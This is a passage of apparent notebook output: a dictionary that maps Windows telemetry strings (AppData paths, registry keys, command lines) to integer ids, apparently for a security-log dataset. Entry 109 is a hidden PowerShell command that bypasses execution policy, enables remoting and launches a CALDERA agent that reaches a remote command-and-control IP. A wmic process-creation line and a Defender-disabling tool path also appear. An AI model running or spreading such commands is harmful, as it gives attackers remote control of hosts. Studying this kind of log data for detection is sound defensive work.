       " 'C:\\\\Users\\\\barnescindy\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.People_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\*': 14,\n",
       " 'C:\\\\Users\\\\ricky35\\\\AppData\\\\Local\\\\Packages\\\\Windows.PrintDialog_cw5n1h2txyewy': 15,\n",
       " 'C:\\\\Users\\\\griffithjohn\\\\AppData\\\\Local\\\\Publishers\\\\8wekyb3d8bbwe\\\\Licenses': 16,\n",
       " 'C:\\\\Users\\\\vbuckley\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.YourPhone_8wekyb3d8bbwe\\\\Settings': 17,\n",
       " 'C:\\\\Users\\\\angela76\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ScreenSketch_8wekyb3d8bbwe\\\\AppData': 18,\n",
       " 'C:\\\\Users\\\\gfields\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\_locales\\\\sr\\\\.git': 19,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\sr-Latn-RS\\\\*': 20,\n",
       " 'C:\\\\Users\\\\david67\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\pjkljhegncpnkpknbcohdijeoejaedia\\\\8.3_0\\\\_locales\\\\hr\\\\.git': 21,\n",
       " 'C:\\\\Users\\\\omcfarland\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aapocclcgogkmnckokdopfmhonfmgoek\\\\0.10_0\\\\_locales\\\\en_US\\\\*': 22,\n",
       " 'C:\\\\Users\\\\nsilva\\\\AppData\\\\Local\\\\Packages\\\\windows_ie_ac_001\\\\AC\\\\Temp\\\\*': 23,\n",
       " 'C:\\\\Users\\\\vbuckley\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\.git': 24,\n",
       " 'C:\\\\Users\\\\sarahchandler\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Windows PowerShell': 25,\n",
       " 'C:\\\\Users\\\\nicholas35\\\\AppData\\\\Local\\\\Packages\\\\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\\\\Settings\\\\.git': 26,\n",
       " 'C:\\\\Users\\\\natalie04\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGameCallableUI_cw5n1h2txyewy\\\\AppData': 27,\n",
       " 'C:\\\\Users\\\\uanderson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsAlarms_8wekyb3d8bbwe\\\\LocalCache': 28,\n",
       " 'C:\\\\Users\\\\dkelly\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Code Cache\\\\wasm\\\\.git': 29,\n",
       " 'C:\\\\Users\\\\scooper\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\fil\\\\*': 30,\n",
       " 'C:\\\\Users\\\\fitzgeraldleslie\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\AC\\\\INetCache': 31,\n",
       " 'C:\\\\Users\\\\crosschristine\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Site Characteristics Database': 32,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\ZxcvbnData\\\\.git': 33,\n",
       " 'C:\\\\Users\\\\xmoore\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Getstarted_8wekyb3d8bbwe\\\\LocalState\\\\.git': 34,\n",
       " 'C:\\\\Users\\\\mariahwilson\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\hu': 35,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\\\\Settings': 36,\n",
       " 'C:\\\\Users\\\\scooper\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.UI.Xaml.2.6_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\*': 37,\n",
       " 'C:\\\\Users\\\\lopezmonica\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\storage\\\\permanent\\\\chrome\\\\idb\\\\3561288849sdhlie.files\\\\*': 38,\n",
       " 'C:\\\\Users\\\\john95\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Speech Recognition\\\\1.15.0.1': 39,\n",
       " 'C:\\\\Users\\\\julie68\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\sr-Cyrl-BA\\\\*': 40,\n",
       " 'C:\\\\Users\\\\jacob97\\\\AppData\\\\Local\\\\Packages\\\\1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy\\\\Settings\\\\*': 41,\n",
       " 'C:\\\\Users\\\\kimberlyalexander\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\AC\\\\Microsoft\\\\CryptnetUrlCache\\\\MetaData\\\\.git': 42,\n",
       " 'C:\\\\Users\\\\gardnerjoseph\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Snapshots\\\\99.0.1150.46\\\\Default\\\\AutofillStrikeDatabase': 43,\n",
       " 'C:\\\\Users\\\\jessicajacobson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ParentalControls_cw5n1h2txyewy\\\\AC': 44,\n",
       " 'C:\\\\Users\\\\amanda90\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\templates\\\\azure\\\\Storage-Account-Private-Container': 45,\n",
       " 'C:\\\\Users\\\\riveragregg\\\\AppData\\\\Local\\\\PeerDistRepub\\\\*': 46,\n",
       " 'C:\\\\Users\\\\meaganaustin\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aapocclcgogkmnckokdopfmhonfmgoek\\\\0.10_0\\\\_locales\\\\fr': 47,\n",
       " 'C:\\\\Users\\\\harristheresa\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\felcaaldnbdncclmgdcncolpebgiejap\\\\1.2_0\\\\_locales\\\\zh_CN\\\\*': 48,\n",
       " 'C:\\\\Users\\\\client1\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsMaps_8wekyb3d8bbwe\\\\AC\\\\INetCookies': 49,\n",
       " 'C:\\\\Users\\\\mariahwilson\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\hi': 50,\n",
       " 'C:\\\\Users\\\\adamslydia\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Service Worker': 51,\n",
       " 'C:\\\\Users\\\\nicholas35\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\AC\\\\AppCache\\\\*': 52,\n",
       " 'C:\\\\Users\\\\chadhicks\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGameOverlay_8wekyb3d8bbwe\\\\TempState': 53,\n",
       " 'C:\\\\Users\\\\hmarsh\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\\\LocalCache\\\\.git': 54,\n",
       " 'C:\\\\Users\\\\steven78\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\pjkljhegncpnkpknbcohdijeoejaedia\\\\8.3_0\\\\_locales\\\\*': 55,\n",
       " 'C:\\\\Users\\\\jessicajacobson\\\\AppData\\\\Local\\\\Mozilla\\\\Firefox\\\\Profiles\\\\.git': 56,\n",
       " 'C:\\\\Users\\\\sanchezmatthew\\\\AppData\\\\Local\\\\Packages\\\\E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy\\\\AC\\\\.git': 57,\n",
       " 'C:\\\\Users\\\\amberhernandez\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsAlarms_8wekyb3d8bbwe\\\\LocalState': 58,\n",
       " 'C:\\\\Windows\\\\SystemResources\\\\SspiCli.dll.mun': 59,\n",
       " 'C:\\\\Users\\\\alisonhaynes\\\\AppData\\\\Local\\\\Microsoft\\\\TokenBroker\\\\Cache': 60,\n",
       " 'C:\\\\Users\\\\meganmaldonado\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\fi-FI\\\\*': 61,\n",
       " 'C:\\\\Users\\\\client1\\\\AppData\\\\Local\\\\Packages\\\\c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy\\\\AC\\\\INetCookies': 62,\n",
       " 'C:\\\\Users\\\\gardnerjoseph\\\\AppData\\\\Local\\\\Packages\\\\ActiveSync\\\\.git': 63,\n",
       " 'C:\\\\Users\\\\skoch\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\sw\\\\*': 64,\n",
       " 'C:\\\\Users\\\\wthornton\\\\Desktop\\\\DefenderControlrPortable': 65,\n",
       " 'C:\\\\Users\\\\meaganaustin\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\resources\\\\scripts\\\\docker\\\\caldera\\\\2.6.6-040520': 66,\n",
       " 'C:\\\\Users\\\\crosschristine\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\hi': 67,\n",
       " 'C:\\\\Users\\\\client1\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.SkypeApp_kzf8qxf38zg5c\\\\Settings\\\\.git': 68,\n",
       " 'C:\\\\Users\\\\richard97\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\\\\AC\\\\INetCookies\\\\*': 69,\n",
       " 'wmic process call create \"3ecfc67294923acdf6bd018a73f6c590\"': 70,\n",
       " 'C:\\\\Users\\\\garypetty\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\es-CO\\\\.git': 71,\n",
       " 'C:\\\\Users\\\\stephaniewood\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy\\\\Settings\\\\*': 72,\n",
       " 'C:\\\\Users\\\\perezkenneth\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Getstarted_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\.git': 73,\n",
       " 'C:\\\\Users\\\\larry44\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\\\LocalCache\\\\Local\\\\Microsoft': 74,\n",
       " 'C:\\\\Users\\\\jacobsmith\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WebMediaExtensions_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\*': 75,\n",
       " 'C:\\\\Users\\\\alisonhaynes\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aohghmighlieiainnegkcijnfilokake\\\\0.10_0\\\\_locales\\\\sl\\\\.git': 76,\n",
       " 'C:\\\\Users\\\\david75\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.YourPhone_8wekyb3d8bbwe\\\\TempState': 77,\n",
       " 'C:\\\\Users\\\\ricky35\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\el\\\\.git': 78,\n",
       " 'C:\\\\Users\\\\jenniferbaxter\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.People_8wekyb3d8bbwe\\\\AC\\\\*': 79,\n",
       " 'C:\\\\Users\\\\steven78\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy\\\\SystemAppData\\\\*': 80,\n",
       " 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\FolderDescriptions\\\\{D20BEEC4-5CA8-4905-AE3B-BF251EA09B53}\\\\StreamResource': 81,\n",
       " 'C:\\\\Users\\\\davidsmith\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\felcaaldnbdncclmgdcncolpebgiejap\\\\1.2_0\\\\_locales\\\\vi\\\\.git': 82,\n",
       " 'C:\\\\Users\\\\jacob97\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGameCallableUI_cw5n1h2txyewy\\\\Settings': 83,\n",
       " 'C:\\\\Users\\\\amy04\\\\AppData\\\\Local\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\cache2\\\\entries\\\\*': 84,\n",
       " 'HKLM\\\\Software\\\\WOW6432Node\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows': 85,\n",
       " 'C:\\\\Users\\\\elizabethgoodman\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\AC\\\\Microsoft\\\\.git': 86,\n",
       " 'C:\\\\Users\\\\garypetty\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Session Storage\\\\*': 87,\n",
       " 'C:\\\\Users\\\\lopezmonica\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe\\\\TempState\\\\*': 88,\n",
       " 'C:\\\\Users\\\\david75\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.HEIFImageExtension_8wekyb3d8bbwe\\\\Settings\\\\.git': 89,\n",
       " 'C:\\\\Users\\\\wyatt69\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\images\\\\lightTheme': 90,\n",
       " 'C:\\\\Users\\\\heatherhoward\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\felcaaldnbdncclmgdcncolpebgiejap\\\\1.2_0\\\\_locales\\\\sl': 91,\n",
       " 'C:\\\\Users\\\\sanchezmatthew\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.549981C3F5F10_8wekyb3d8bbwe\\\\RoamingState\\\\.git': 92,\n",
       " 'C:\\\\Users\\\\ndalton\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WebMediaExtensions_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\.git': 93,\n",
       " 'C:\\\\Users\\\\brucegriffin\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Xbox.TCUI_8wekyb3d8bbwe\\\\AC\\\\*': 94,\n",
       " 'C:\\\\Users\\\\evan17\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Service Worker\\\\CacheStorage\\\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\\\faf4f793-ede9-45f4-b561-85e54c465501\\\\index-dir': 95,\n",
       " 'C:\\\\Users\\\\elizabethgoodman\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy\\\\AC\\\\Temp\\\\*': 96,\n",
       " 'C:\\\\Users\\\\uanderson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.AsyncTextService_8wekyb3d8bbwe\\\\LocalCache\\\\*': 97,\n",
       " 'C:\\\\Users\\\\evan17\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Network\\\\*': 98,\n",
       " 'C:\\\\Users\\\\kimberlyalexander\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\AC\\\\Microsoft\\\\CryptnetUrlCache\\\\*': 99,\n",
       " 'C:\\\\Users\\\\victoriacole\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\fi\\\\*': 100,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\AC\\\\Microsoft\\\\CryptnetUrlCache\\\\MetaData\\\\.git': 101,\n",
       " 'C:\\\\Users\\\\nholt\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\mn\\\\.git': 102,\n",
       " 'C:\\\\Users\\\\kathrynhall\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Photos_8wekyb3d8bbwe': 103,\n",
       " 'C:\\\\Users\\\\priscillaroberson\\\\AppData\\\\Roaming\\\\Microsoft\\\\Internet Explorer\\\\UserData\\\\Low\\\\*': 104,\n",
       " 'C:\\\\Users\\\\fitzgeraldleslie\\\\AppData\\\\Local\\\\Packages\\\\E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy\\\\AC\\\\INetCache\\\\*': 105,\n",
       " 'LAMIRE': 106,\n",
       " 'C:\\\\Users\\\\desireesantana\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGameOverlay_8wekyb3d8bbwe\\\\LocalState\\\\.git': 107,\n",
       " 'C:\\\\Users\\\\larry44\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy\\\\TempState': 108,\n",
       " 'powershell.exe -ExecutionPolicy Bypass -C \"$wc=New-Object System.Net.WebClient;$output=\\\\\"PowerShellCore.msi\\\\\";$wc.DownloadFile(\\\\\"https://github.com/PowerShell/PowerShell/releases/download/v6.2.2/PowerShell-6.2.2-win-x64.msi\\\\\", $output);Start-Process msiexec.exe -ArgumentList \\\\\"/package PowerShellCore.msi /quiet ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL=1 ENABLE_PSREMOTING=1 REGISTER_MANIFEST=1\\\\\" -Wait;$env:Path += \\\\\";C:\\\\Program Files\\\\Powershell\\\\6\\\\\";Start-Process pwsh -ArgumentList \\\\\"-c C:\\\\Users\\\\Public\\\\sandcat.go-windows.exe -server http://38.147.122.251/tor/micro/d/flvnBFO7aooEi/Ota+OTBrjtJM1BFzugFRG097+uETM-b1yHYnAHWu7yp7zmoyOFxGqsz9cRU0R291Aja2grUo8-eMGUWrIcbejzmmBw9/C20Nm+kPahIjSR7LXOK1p9alA-CkxtwS2UygICgI/WxNuvFFIAkdXru+fDW4QvKllotgY-yFlyGn3HpVxpMlWynrfpAK89YcktX0EQOokfP6xH3UY-TOE28AOCTRZ0YlkAeqtvJRBwB2m364NzNqx/FodHulg-cSLxPPNnpt6xL78t+EZboeuMei3aMMtxONxqo7E/III-ePt1wNGrtXv2pLkN7dnN1AJA955txP3qNu4ogFHh5mA-oXRX4JMP5tu6maRf14qdA0zIzgr0BW0TFr5sJwTF8Jk-pf9FUFcxfnh93FBjGhNLLIpMm56IYQ4cUuBMQagjg2w-QxAhOV8Eva1GEfWLWefTP1xpjaf68kifwSM5xD/ggKo-45RsG3KOOV1AMmYVIhm03p1DkslwBJ1EPQo72okeLVw-Z95rTeP52h1ephLoLs0VtKCFhsE0HgBLZTxrA0COPOI-CW3/yBf6DxShImTL8iBNGnJ1hPKbomPgLQeXW7vbl2w-YMuFgzWl6vd3YsyBfYmMz1ZjcaMwrkxrqGm4heukkk8-Md01oo05BRzqYo0RxAnJv25xPvCq4vWpJYpJyPdYSWk-3E6F/v8oDIXrpdYqO/9vKpSnGLP4n65vGD4OSsnkKRs-ZjW2fQbq02b9FZugHtihwpD4l+ncReO1trDPoN/MCfU-Pcv5njv48Uc7pPSlud/7GYgOW5e4RB6f48eR6VvUDDc-VGTeayc4K1JLPg4ztvdoiuPhFsn98qnH9G9VFApURBo-bLFGrW+TBLYCUiJd1000JkM9Cqyqy4bRTDF3IvItYeE-OU9sIFld8CaR1onU8BFj62haoiMIyZ2sP80yznbjbpI-rfaREnpaJJmDxjU1WmPbOZC6zJhF2K4zcUuSxXIu5I4-XoCtpEI0rxeK7JJzhpvVsqt7OoDpEDTrqsWJoz34Wm4-44RH8wfKN6+88axDfQyf4PpcIZYr9oAbTnE9rs13+cY-/bqddtOsYADFqcY3Hr7Ma3K/V47nOeMWiTAD92wUm6w-dKfugxwTbM1DLf2bQQSfVWaK4hC8t/sMR347gm2I75k-6FcN1QuUDSTSg99JivGrpMkgW5K3lDf6q0bWLab7PpE-AO4mYpVOI9dCQU0Lfm0b9WF2AQr1nawIdqpuvXaP7Zs-fSP8WCqcUlJmLDzuu+FXcTXT2iKyD78F8JBIVXQy5lI-krq0rU54e+t/YWjYz3zkFSdYm/xJ4w05+TdMS9hBDuc-FDY9mctVGSVER3O8bmY/fLvEzQs2ym0Zv1XfMdqz6YE-EMtxZsoW1o/Oydn0gJtP2JCGbCEizbG2hcZxD6sHYZI-0PbfelOAFHUfIv9bHaEEEHiXOdm6YMqAYvj5z+JZjOE-E6sHCy6cIR0qbNEmMupoYJw3EtEa+U/7MQOd3OUL5iA-66wr1N4YtZsjJ137iPlI2+i2hbBjTXYcO4SuHu4f4aU-VurQmo2B9bJSGi+CXuRWmGUAcvl9zGLkiTBTY9+eaN4-X6Wy+2UNuOnr5S45BJZ2G/SW/ljkI2Aelk5LQ/LX990-ffS4Vi7SelAmAfAfg99+sYsEJ6hVMptyfRVCTO8Z4VI-ht47QIYzyoi3RId10pk3aUDNOUzOYjVlRwn2JCin3W0-7+MJqJv9+bnLaagu5+X2T2SsH/V5qKH4sSutsY6YHrs-W2EDPrLEw2xXm/t5ycdLiptKnDSKiohgp49UJRHxxwM-qfaXYWT/g0CIhyQ7mNo0hGW/FgBUAduKUF656y3OLLw-zTKZ6vpQuGDFilqKAlUipAs4p7td55kMvRxliVgjL/4-ZkExWn0zi4joCC/JRUtop9/yGRvfMQXCi91tn0jbjL0-8s3Ko09Tlq4po6ijiu1PJF4NwzQApiUwo7cW2SlDETM-uwtJo8CvR3KSpFMYF2ecg5gfnMybp5Ozda07ksIHnuE-sowskPXLCCoou4rbN1Jcp5uEvFKAacd95gGcqOB5+3I-Vqm4dbmPwI79h4kWgxiaDX4ECPg0ZzMkGspGnI8Dv9Y-u2ad6hdPBikkONK6VjQmtmqiYb4zV8Zi60uD5s2WzzU-Ic0GpWlupg/ybYcIyPiyW8aya66HghUfRvNAar5vJpg-KHixS4GtfQBeZBtmUlmV9C8YGqR27u7K1oRaYhoFD4Y-u//xDaipRj5moMsmlPZjHwf5M/kvhTWaDEn8cfyed+k-5TVcNnoOTOZ4yMNxB+P/Wb9O3/0805JeCPgkZ+NF/0g-Twpb6f6LxkXB2ZY81w8w5ON9hI3qAXh4np09NGX7C2U-+5IyA734bNyyqIuC0ovt/kmfm3w33bSpejuTYCqQNyw-rsUAsE7FqW6TtWyY75Ee6XYKgfgTxhJxyQ/B5ZM4sUw-Q8xyLKgyb6YUxj7NGVs76I0pm40QYx71YWNTkimCOfA-ifjMygOuIRU9mVRIxZH5qC7wcoaxjBeGrR6IIW9qbvw-WCfH2Bbd2adG1TcmhYdTqdk4X3ByX0d2FUaVp/dbNHE-qqGVJ3gmYGV9L4G3REakG8A5pjrzJ75i2tby2jZW368-cKFBSY1U2KjsNrFnQw3+WYfMG4Y64GiPM265hvyQ8TM-IuRWfxZNqNg2mVhJ/bOOq55oEESCQVvki2a4rhtA9/Y-IRxD3mug63kPZYQiDXs2Wh10L2Fh9091lv0dPs1F9dE - group CALDERA\\\\\" -WindowStyle hidden;\"': 109,\n",
       " 'C:\\\\Users\\\\inguyen\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\resources\\\\configs\\\\nxlog': 110,\n",
       " 'C:\\\\Users\\\\barnescindy\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.CredDialogHost_cw5n1h2txyewy\\\\AC\\\\INetCookies\\\\*': 111,\n",
       " 'C:\\\\Users\\\\kimberlyalexander\\\\AppData\\\\Local\\\\Packages\\\\F46D4000-FD22-4DB4-AC8E-4E1DDDE828FE_cw5n1h2txyewy\\\\AC\\\\*': 112,\n",
       " 'C:\\\\Users\\\\leahbrown\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\sr-Cyrl-BA\\\\.git': 113,\n",
       " 'C:\\\\Users\\\\wyatt69\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy\\\\Settings': 114,\n",
       " 'C:\\\\Users\\\\fgarrison\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\pjkljhegncpnkpknbcohdijeoejaedia\\\\8.3_0\\\\_locales\\\\nl': 115,\n",
       " 'C:\\\\Users\\\\john95\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\LocalState\\\\*': 116,\n",
       " 'C:\\\\Users\\\\garypetty\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\pjkljhegncpnkpknbcohdijeoejaedia\\\\8.3_0\\\\_locales\\\\hr\\\\*': 117,\n",
       " 'C:\\\\Users\\\\sarahchandler\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.SecHealthUI_cw5n1h2txyewy\\\\RoamingState\\\\.git': 118,\n",
       " 'C:\\\\Users\\\\nataliekent\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.UI.Xaml.2.6_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\*': 119,\n",
       " 'C:\\\\Users\\\\larry44\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.BingWeather_8wekyb3d8bbwe\\\\TempState\\\\.git': 120,\n",
       " 'C:\\\\Users\\\\annetteyoung\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Service Worker': 121,\n",
       " 'C:\\\\Users\\\\amberhernandez\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxSpeechToTextOverlay_8wekyb3d8bbwe\\\\RoamingState\\\\*': 122,\n",
       " 'C:\\\\Users\\\\jacob97\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdge.Stable_8wekyb3d8bbwe\\\\AC\\\\Temp': 123,\n",
       " 'C:\\\\Users\\\\jennifertaylor\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.AsyncTextService_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\.git': 124,\n",
       " 'C:\\\\Users\\\\sanchezmatthew\\\\AppData\\\\Local\\\\Temp\\\\MozillaBackgroundTask-308046B0AF4A39CB-backgroundupdate-2\\\\cache2\\\\doomed\\\\*': 125,\n",
       " 'C:\\\\Users\\\\sanchezmatthew\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aohghmighlieiainnegkcijnfilokake\\\\0.10_0\\\\_locales\\\\da': 126,\n",
       " 'C:\\\\Users\\\\wthornton\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsCalculator_8wekyb3d8bbwe\\\\AC\\\\INetCookies\\\\.git': 127,\n",
       " 'C:\\\\Users\\\\john95\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\lt\\\\*': 128,\n",
       " 'C:\\\\Users\\\\devon54\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy': 129,\n",
       " 'C:\\\\Users\\\\richard97\\\\AppData\\\\Local\\\\Temp\\\\MozillaBackgroundTask-308046B0AF4A39CB-backgroundupdate-1\\\\.git': 130,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Temp\\\\MozillaBackgroundTask-308046B0AF4A39CB-backgroundupdate-3\\\\.git': 131,\n",
       " 'C:\\\\Users\\\\ijohnson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\BackgroundTransferApi\\\\.git': 132,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MSPaint_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\*': 133,\n",
       " 'C:\\\\Users\\\\ngray\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\adm\\\\ja\\\\.git': 134,\n",
       " 'C:\\\\Users\\\\client1\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxSpeechToTextOverlay_8wekyb3d8bbwe\\\\AppData\\\\.git': 135,\n",
       " 'C:\\\\Users\\\\amberhernandez\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\_locales\\\\fi\\\\*': 136,\n",
